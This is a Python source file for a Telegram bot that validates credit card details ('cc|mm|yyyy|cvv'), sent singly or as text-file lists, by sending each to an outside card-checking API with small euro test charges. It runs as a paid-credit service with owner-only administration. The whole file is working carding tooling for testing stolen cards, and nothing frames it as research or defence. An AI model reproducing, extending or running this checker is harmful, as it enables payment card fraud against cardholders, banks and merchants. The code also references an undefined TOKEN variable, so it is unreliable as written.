import logging
import requests
import telebot
from threading import Event
import time
import json
from config import BOT_TOKEN
from config import OWNER_ID


# Telegram bot token
# TOKEN = ""
# OWNER_ID = 6899244704  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint and static parameters
url = "https://daxxteam.com/chk/api.php"

# Event to control the stopping of the card check process
stop_event = Event()

# Lists to store authorized group IDs and user IDs with credits
authorized_groups = []
user_credits = {}

# Load authorized groups and user credits from file (if exists)
try:
    with open('authorized_groups.json', 'r') as file:
        authorized_groups = json.load(file)
except FileNotFoundError:
    authorized_groups = []

try:
    with open('user_credits.json', 'r') as file:
        user_credits = json.load(file)
except FileNotFoundError:
    user_credits = {}

def save_authorized_groups():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

def save_user_credits():
    with open('user_credits.json', 'w') as file:
        json.dump(user_credits, file)

# Start command handler
@bot.message_handler(commands=['checker'])
def send_welcome(message):
    bot.send_message(message.chat.id, "Welcome! Use /register to register and get 10 credits. Use the /chk command followed by card details in the format `cc|mm|yyyy|cvv`, or send a TXT file with card details. Use /stop to stop the card check process.")

# /cmds command handler
@bot.message_handler(commands=['cmds'])
def send_cmds(message):
    cmds_message = (
        "Available commands:\n"
        "/cheker - Welcome message\n"
        "/cmds - List all commands\n"
        "/register - Register and get 10 credits\n"
        "/info - Get your information\n"
        "/add - Authorize a group or user\n"
        "/remove - Unauthorize a group or user\n"
        "/chk - Check card details\n"
        "/stp - Stop the card check process\n"
    )
    bot.reply_to(message, cmds_message)

# /register command handler
@bot.message_handler(commands=['register'])
def register_user(message):
    user_id = message.from_user.id
    if user_id in user_credits:
        bot.reply_to(message, "You are already registered.")
        return
    
    user_credits[user_id] = 10
    save_user_credits()
    bot.reply_to(message, "You have been registered and received 10 credits.")

# /info command handler
@bot.message_handler(commands=['info'])
def user_info(message):
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "You are not registered. Use /register to register.")
        return

    credits = "Unlimited" if user_id == OWNER_ID else user_credits.get(user_id, 0)
    rank = "Owner" if user_id == OWNER_ID else "Free"
    username = message.from_user.username or "N/A"
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
    
    info_message = (
        f"User Information:\n"
        f"Username: {username}\n"
        f"User ID: {user_id}\n"
        f"Full Name: {full_name}\n"
        f"Credits: {credits}\n"
        f"Rank: {rank}\n"
    )
    bot.reply_to(message, info_message)

# /add command handler to authorize a group or user
@bot.message_handler(commands=['add'])
def add_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /add group <group_id> or /add <user_id> <credits>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id not in authorized_groups:
            authorized_groups.append(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"Group {group_id} has been authorized for CC checks.")
        else:
            bot.reply_to(message, f"Group {group_id} is already authorized.")

    else:
        if len(args) != 3:
            bot.reply_to(message, "Usage: /add <user_id> <credits>")
            return
        user_id = int(args[1])
        credits = int(args[2])
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.reply_to(message, f"User {user_id} has been authorized with {credits} credits.")

# /remove command handler to unauthorize a group or user
@bot.message_handler(commands=['remove'])
def remove_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /remove group <group_id> or /remove userid <user_id>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id in authorized_groups:
            authorized_groups.remove(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"Group {group_id} has been unauthorized.")
        else:
            bot.reply_to(message, f"Group {group_id} is not authorized.")

    elif args[1] == 'userid':
        user_id = int(args[2])
        if user_id in user_credits:
            del user_credits[user_id]
            save_user_credits()
            bot.reply_to(message, f"User {user_id} has been unauthorized.")
        else:
            bot.reply_to(message, f"User {user_id} is not authorized.")

    else:
        bot.reply_to(message, "Invalid type. Use 'group' or 'userid'.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_card(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "You don't have enough credits to use this command.")
        return

    card_details = message.text.split()[1:]
    if not card_details:
        bot.reply_to(message, "Please provide card details in the format `cc|mm|yyyy|cvv`.")
        return

    stop_event.clear()

    for card in card_details:
        if stop_event.is_set():
            bot.reply_to(message, "Card check process stopped.")
            break

        if user_id != OWNER_ID:
            user_credits[user_id] -= 1
            save_user_credits()

        start_time = time.time()
        params = {
            'lista': card,
            'mode': 'cvv',
            'amount': 0.5,
            'currency': 'eur'
        }
        try:
            response = requests.get(url, params=params)
            end_time = time.time()
        except requests.exceptions.RequestException as e:
            bot.reply_to(message, f"Error connecting to API: {e}")
            continue
        
        if response.headers.get('Content-Type') == 'application/json':
            try:
                response_data = response.json()
                bot.reply_to(message, response_data.get("response", "No response"))
            except requests.exceptions.JSONDecodeError:
                bot.reply_to(message, f"Failed to decode JSON response. Response content: {response.text}")
                continue
        else:
            bot.reply_to(message, response.text)

        time.sleep(10)

# Document handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "You are not registered. Use /register to register.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "You don't have enough credits to use this command.")
        return

    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()

        for lista in lista_values:
            if stop_event.is_set():
                bot.reply_to(message, "Card check process stopped.")
                break

            if user_id != OWNER_ID:
                user_credits[user_id] -= 1
                save_user_credits()

            start_time = time.time()
            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',# use any gate  cnn cvv 
                    'amount': 0.5,
                    'currency': 'eur'
                }
                try:
                    response = requests.get(url, params=params)
                    end_time = time.time()
                except requests.exceptions.RequestException as e:
                    bot.reply_to(message, f"Error connecting to API: {e}")
                    continue
                
                if response.headers.get('Content-Type') == 'application/json':
                    try:
                        response_data = response.json()
                        bot.reply_to(message, response_data.get("response", "No response"))
                    except requests.exceptions.JSONDecodeError:
                        bot.reply_to(message, f"Failed to decode JSON response. Response content: {response.text}")
                        continue
                else:
                    bot.reply_to(message, response.text)

                time.sleep(10)

# /stop command handler
@bot.message_handler(commands=['stp'])
def stop_process(message):
    if message.from_user.id == OWNER_ID:
        stop_event.set()
        bot.reply_to(message, "Card check process has been stopped.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling(none_stop=True)
    
